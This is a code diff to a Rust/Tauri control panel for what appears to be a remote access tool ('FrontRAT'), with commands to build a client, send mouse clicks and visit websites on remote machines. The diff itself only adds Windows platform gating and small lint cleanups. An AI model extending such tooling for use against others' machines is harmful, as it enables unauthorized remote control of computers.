@@ -12,8 +12,11 @@ use tokio::net::TcpListener;
 use tokio::sync::mpsc;
 use tokio::sync::mpsc::Sender;
 
-use std::ptr::null_mut as NULL;
+#[cfg(target_os = "windows")]
 use winapi::um::winuser;
+#[cfg(target_os = "windows")]
+use std::ptr::null_mut as NULL;
+
 use common::packets::TrollCommand;
 
 use tauri::AppHandle;
@@ -42,7 +45,7 @@ pub async fn get_channel_tx(
                 event_type: "server_error".to_string(),
                 message: "Server not running!".to_string(),
             };
-            let _ = app_handle
+            app_handle
                 .emit("server_log", log)
                 .unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
             return Err("Server not running".to_string());
@@ -55,7 +58,7 @@ pub async fn get_channel_tx(
                 event_type: "server_error".to_string(),
                 message: "Server channel not initialized!".to_string(),
             };
-            let _ = app_handle
+            app_handle
                 .emit("server_log", log)
                 .unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
             return Err("Server channel not initialized".to_string());
@@ -189,7 +192,7 @@ pub async fn fetch_state(
 ) -> Result<FrontRATState, FrontRATState> {
     let tauri_state = tauri_state.0.lock().unwrap();
     Ok(FrontRATState {
-        running: tauri_state.running.clone(),
+        running: tauri_state.running,
         port: tauri_state.port.clone(),
     })
 }
@@ -216,7 +219,7 @@ pub async fn build_client(
         event_type: "build_client".to_string(),
         message: "Building client...".to_string(),
     };
-    let _ = app_handle
+    app_handle
         .emit("server_log", log)
         .unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
 
@@ -242,7 +245,7 @@ pub async fn build_client(
                 event_type: "build_finished".to_string(),
                 message: "Client built successfully.".to_string(),
             };
-            let _ = app_handle
+            app_handle
                 .emit("server_log", log)
                 .unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
         }
@@ -251,7 +254,7 @@ pub async fn build_client(
                 event_type: "build_failed".to_string(),
                 message: "Failed to build client.".to_string(),
             };
-            let _ = app_handle
+            app_handle
                 .emit("server_log", log)
                 .unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
             return Err(e.to_string());
@@ -408,8 +411,8 @@ pub async fn send_mouse_click(
             addr.parse().unwrap(),
             MouseClickData {
                 display,
-                x: x as i32,
-                y: y as i32,
+                x,
+                y,
                 click_type,
                 action_type,
                 scroll_amount: scroll_amount.unwrap_or(0),
@@ -446,11 +449,11 @@ pub async fn visit_website(
     Ok("Website visited".to_string())
 }
 
+#[cfg(target_os = "windows")]
 #[tauri::command]
 pub fn test_messagebox(title: &str, message: &str, button: &str, icon: &str) {
     let l_msg: Vec<u16> = format!("{}\0", message).encode_utf16().collect();
     let l_title: Vec<u16> = format!("{}\0", title).encode_utf16().collect();
-
     unsafe {
         winuser::MessageBoxW(
             NULL(),
@@ -474,6 +477,12 @@ pub fn test_messagebox(title: &str, message: &str, button: &str, icon: &str) {
             }),
         );
     }
+}
+
+#[cfg(not(target_os = "windows"))]
+#[tauri::command]
+pub fn test_messagebox(_title: &str, _message: &str, _button: &str, _icon: &str) {
+    // No-op on non-Windows platforms
 }
 
 #[tauri::command]
